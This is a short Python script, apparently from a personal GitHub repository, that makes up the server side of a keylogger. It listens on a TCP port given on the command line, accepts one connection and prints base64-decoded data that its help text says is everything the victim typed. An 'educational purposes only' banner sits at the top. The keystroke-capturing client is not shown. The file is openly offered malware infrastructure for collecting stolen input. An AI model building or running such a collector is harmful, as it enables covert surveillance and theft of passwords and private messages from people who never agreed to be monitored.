########### keylogger  ########
########### Author: Nadav Yarkon #############
##This tool is for educational purposes only. don't use them for illegal activities!##

#Author: Nadav Yarkon
#Email: Nadavy2469 @ gmail.com
#https: https://github.com/Nadav-Yarkon


import socket
import base64
import argparse

def RunServerKyloger(Host , Port):
    print ("The server is listening.")
    sock_info = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_info.bind((Host, Port))
    sock_info.listen(1)
    conn, addr = sock_info.accept()
    print('Got connection from', addr)
    while True:
        data = conn.recv(1024)
        data = str(base64.b64decode(data))[2:-1]
        print(data)


parser = argparse.ArgumentParser(description='The program needs to get  IP and Port for listening \n' 
                                            'Enter the IP and Port in Keylogger program  \n'
                                             'This program print all the user wrote. \n')
parser.add_argument("-i", "-ip" , metavar='' , required=True , help= "IP that the server was listening" , type=str)
parser.add_argument("-p", "-port" , metavar='' , required=True , help="Port that the server was listening" ,type=int)
parser.parse_args()
args = parser.parse_args()
RunServerKyloger(args.i , args.p)